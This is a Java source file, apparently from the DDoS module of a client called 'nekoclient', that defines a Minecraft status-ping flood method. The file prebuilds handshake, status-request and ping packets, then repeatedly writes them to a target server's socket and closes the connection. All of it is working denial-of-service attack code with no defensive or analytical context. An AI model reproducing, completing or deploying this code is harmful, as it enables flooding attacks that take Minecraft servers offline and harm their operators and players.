package dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.MinecraftMethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.State;
import dev.neko.nekoclient.api.ddos.impl.handler.minecraft.type.Type;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;

public class MinecraftStatusPingMethod extends MinecraftMethodHandler {
   private ByteBuffer buffer;

   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) throws IllegalArgumentException {
      super.init(protocol, address, host, options);
      ByteBuffer handshake = this.createHandshakePacket(this.protocolVersion, this.host, this.port, State.STATUS);
      ByteBuffer statusRequest = this.createPacket(0, new Type[0]);
      ByteBuffer pingRequest = this.createPacket(1, new Type[0]);
      this.buffer = ByteBuffer.allocate(handshake.capacity() + statusRequest.capacity() + pingRequest.capacity());
      this.buffer.put(handshake);
      this.buffer.put(statusRequest);
      this.buffer.put(pingRequest);
      ((Buffer)this.buffer).flip();
   }

   @Override
   public void handle(SocketChannel channel) throws IOException {
      channel.write(this.buffer.duplicate());
      channel.close();
   }
}
